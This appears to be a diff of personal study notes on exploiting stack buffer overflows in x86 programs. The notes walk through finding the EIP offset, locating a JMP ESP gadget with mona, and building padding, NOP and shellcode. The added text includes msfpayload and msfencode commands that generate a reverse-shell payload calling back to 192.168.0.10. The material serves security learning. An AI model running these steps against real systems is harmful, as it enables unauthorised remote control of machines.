@@ -1,20 +1,38 @@
 *Buffers overflow*
 Protection techniques
-    Data Execution Prevention (DEP) prevents executing instructions in data pages.
-    Address Space Layout Randomization (ASLR) randomizes addresses of loaded apps, libraries and os.
+    Data Execution Prevention (*DEP*) prevents executing instructions in data pages.
+    Address Space Layout Randomization (*ASLR*) randomizes addresses of loaded apps, libraries and os.
     Both the operating system and the binary needs to support it.
-Buffers overflow
-Exploitation
-    Determine length of overflow trigger w/ binary search "A"x1000
-    Determine exact EIP with pattern_create.rb & pattern_offset.rb
-    Determine badchars to make sure all of your payload is getting through
-    Develop exploit
-    Is the payload right at ESP
-    JMP ESP
-    Is the payload before ESP
-    sub ESP, 200 and then JMP ESP
-    or
-    call [ESP-200]
-    msfvenom -a x86 --platform windows/linux -p something/shell/reverse_tcp lhost=x.x.x.x lport=53 -f exe/elf/python/perl/php -o filename
-    Make sure it fits your payload length above
-    Gain shell, local priv esc or rooted already?
+
+Identification
+    Fuzz the app and identify a crash. Debug the app, find the instruction pointer *EIP* overwritten.
+    Determine the exact size of the buffer needed to overwrite EIP. You can generate a unique string with:
+    *$ /usr/share/metasploit-framework/tools/pattern_create.rb 2700*
+    Send the payload and find the value of EIP, and find the exact length needed with:
+    *$ /usr/share/metasploit-framework/tools/pattern_offset.rb 39694438
+[*] Exact match at offset 2606*
+    Run *badchars.py* and find potential bad characters that the application truncates. (I.E 0x00, in Pop3 new line char(0xA) as it is the command separator, etc..).
+
+Find valid ESP address
+    Now we need to guess the address of the stack *ESP*, where our payload will land. This is the address that we need to overwrite the EIP with. The ESP address is going to change at every execution as not always the same data is loaded. You can however jump to a *JMP_ESP* that is static in a module of the app.
+
+    To find the modules that don't have ASLR and DES, you can run within the ImmunityDebugger:
+    *!mona modules*
+    Now, you can see how the asm *JMP_ESP* looks like in machine code by running:
+    *# /usr/share/metasploit-framework/tools/nasm_shell.rb nasm > jmp esp
+00000000 FFE4 jmp esp
+nasm >*
+    Now you can find *FFE4* with:
+    *!mona find -s '\xff\xe4' -m module.dll*
+    It will find some addrs such as *0x5f4a358f*, since x86 is little endian you need to encode it as * \x8f\x35\x4a\x5f*.
+    To generate the payload
+
+Develop exploit
+    List all available payloads in metasploit:
+    *$ msfpayload –l*
+    Generate a reverse shell shellcode:
+    *$ msfpayload windows/shell_reverse_tcp LHOST=192.168.0.10 LPORT=443 C*
+    The payload will contain illegal characters, you can filter those out using *msfencode*:
+    *$ msfpayload windows/shell_reverse_tcp LHOST=192.168.0.10 LPORT=443 R | msfencode -b "\x00\x0a\x0d"*
+    Pad the remaining bits with *NOP* in hex *0x90*, so the data sent looks like:
+    *"A"*2606 + "\x8f\x35\x4a\x5f" + "\x90" * 8 + shellcode*
